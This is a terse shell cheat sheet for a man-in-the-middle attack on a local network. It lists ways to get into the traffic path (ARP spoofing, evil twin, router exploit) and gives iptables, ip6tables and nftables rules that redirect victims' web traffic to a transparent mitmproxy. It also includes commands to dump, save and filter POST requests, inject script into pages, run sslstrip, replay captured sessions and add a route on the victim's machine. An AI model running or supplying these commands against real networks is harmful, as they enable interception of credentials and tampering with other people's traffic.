# somehow become the mitm
# - arp spoof
# - evil twin
# - exploit router

# relay the packets to their original destination, as in a direct connection
sysctl -w net.ipv4.ip_forward=1
sysctl -w net.ipv6.conf.all.forwarding=1

# redirect http traffic to the proxy
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080

# idem, for ipv6
ip6tables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
ip6tables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080

# using nftables
nft add rule ip nat PREROUTING tcp dport 80 counter redirect to :8080
nft add rule ip nat PREROUTING tcp dport 443 counter redirect to :8080

nft add rule ip6 nat PREROUTING tcp dport 80 counter redirect to :8080
nft add rule ip6 nat PREROUTING tcp dport 443 counter redirect to :8080

# dump the traffic
mitmdump --mode transparent -l 8080

# modify the traffic first
mitmdump --mode transparent --replace :~s:"</body>":"<script>alert('hehe :)');</script></body>"

# use custom scripts
# see https://github.com/mitmproxy/mitmproxy/tree/v2.0.2/examples/complex
mitmdump --mode transparent -s /some/script.py
mitmdump --mode transparent -s sslstrip.py

# save the traffic
mitmdump --mode transparent -w outfile

# filter the traffic
# only intercept post requests
mitmdump --mode transparent "~m post"

# visualize the traffic
mitmweb --mode tranparent

# client replay (!)
mitmdump -nc outfile

# clean / reset the iptables etc

# add a hop from the victim's machine (cmd)
# route print
route ADD 0.0.0.0 MASK 255.255.255.255 10.0.0.1
